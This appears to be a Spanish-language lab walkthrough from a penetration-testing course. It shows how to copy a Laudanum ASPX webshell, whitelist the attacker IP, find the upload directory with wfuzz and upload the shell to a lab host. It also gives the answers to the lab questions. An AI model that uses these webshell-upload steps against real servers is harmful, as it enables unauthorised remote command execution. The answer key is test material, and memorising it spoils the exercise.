
**Laudanum** es un repositorio de archivos predefinidos que permite:
- Inyectar en una víctima y acceder a ella mediante una reverse shell
- Ejecutar comandos desde el navegador (webshell)
Incluye payloads preparados para atentar contra diferentes lenguajes de aplicaciones web: asp, aspx, jsp, php....

Los archivos de Laudanum se encuentran en el directorio*/usr/share/laudanum*.

Vamos a probar una webshell contra un servicio web.

Vamos a copiarnos una webshell en:
```shell-session
Polika4RM@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```


Las principales tecnologías de sitios web son:

|Lenguaje/Plataforma|Extensión de archivo webshell|Comentario|
|---|---|---|
|ASP clásico|`.asp`|Servidores Windows antiguos con IIS.|
|ASP.NET|`.aspx`|Windows moderno con IIS; muy usado en aplicaciones empresariales.|
|JSP (Java)|`.jsp`|Servidores Java/Tomcat, típicos en aplicaciones corporativas Java.|
|PHP|`.php`|Servidores Linux/Windows con PHP instalado; el más común en web pública.|

Como modificaciones en este archivo, deberemos añadir nuestra IP (10.10.14.12) en la línea 59 del archivo demo.aspx.
```
string[] allowedIps = new string[] {"::1", "192.168.0.1", "127.0.0.1", "10.10.14.12"};
```

En el servidor web "status.inlanefreight.local" existe un botón de subir archivo. Cargamos dicha shell.
En el navegador, ingreamos a "status.inlanefreight.local//files/demo.aspx".
Y desde aquí podremos tener una webshell.

---
**QUESTIONS**
**Target: 10.129.42.197**
**VHOST needed:**
**1. Establish a web shell session with the target using the concepts covered in this section. Submit the full path of the directory you land in. (Format: c:\path\you\land\in)**

En primer lugar, en la máquina atacante añadimos el VHOST que aloja la máquina víctima, con:
```
echo "10.129.42.197 status.inlanefreight.local" | sudo tee -a "/etc/hosts"
```
Este comando lo que hace es añadir a /etc/hosts el texto "10.129.42.197 status.inlanefreight.local".
Esta página, al final de todo, nos permite subir un archivo. Aqui es donde subiremos la webshell. Pide que el formato sea únicamente .zip o tar.gz files.

Nos copiamos el archivo:
```
cp /usr/share/laudanum/aspx/shell.aspx .
```

Añadiendo a la línea 59 nuestra IP atacante: 
```
string[] allowedIps = new string[] {"::1","192.168.0.1", "127.0.0.1", "10.10.15.80"};
```

Subimos dicha Shell al servidor con la opción de "Upload File", y vamos a realizar fuzzing para descubir donde se aloja dicho archivo.
Ejecutamos:
```
wfuzz --hl=29 -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://status.inlanefreight.local/FUZZ
```
Y nos devuelve que existe el subdirectorio
```
http://status.inlanefreight.local/files
```

Pues, desde el navegador ejecutamos: 
```
http://status.inlanefreight.local/shell.aspx
```
Y vemos como nos encotramos en una webshell.
Esta es una máquina windows, pues, para ver el directorio actual en el que me encuentro ejecuto solamente: 
```
cd
```

Siendo al respuesta *c:\windows\system32\inetsrv*


**2.  Where is the Laudanum aspx web shell located on Pwnbox? Submit the full path. (Format: /path/to/laudanum/aspx)**
La respuesta es: */usr/share/laudanum/aspx/shell.aspx*

